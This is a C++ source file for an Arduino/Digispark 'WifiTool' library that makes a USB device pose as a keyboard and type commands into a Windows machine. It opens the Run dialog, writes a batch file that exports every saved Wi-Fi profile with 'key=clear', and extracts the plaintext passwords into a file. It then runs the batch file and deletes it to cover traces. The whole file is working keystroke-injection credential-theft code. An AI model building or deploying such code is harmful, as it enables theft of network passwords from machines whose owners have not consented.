#include "Arduino.h"
#include "DigiKeyboard.h"
#include <WifiTool.h>


WifiTool::WifiTool(){
}

void WifiTool::ctrKey(String key){
    byte keyVal;
    if (key == "r"){
        keyVal = 21;
    }
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(keyVal, MOD_GUI_LEFT);
    //DigiKeyboard.delay(200);

}

void WifiTool::runCommand(String command){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.println(command);
    DigiKeyboard.delay(125);
}

void WifiTool::writeBatFile(){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.println("New-Item -Path . -Name \"testfile1.bat\" -ItemType \"file\" -Value \"netsh wlan export profile key=clear \npowershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > Wi-Fi-Pass\"");
}

void WifiTool::delBatFile(){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.println("del testfile1.bat");
    DigiKeyboard.delay(125);
}

void WifiTool::runScript(){
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.println(".\\testfile1.bat");

}

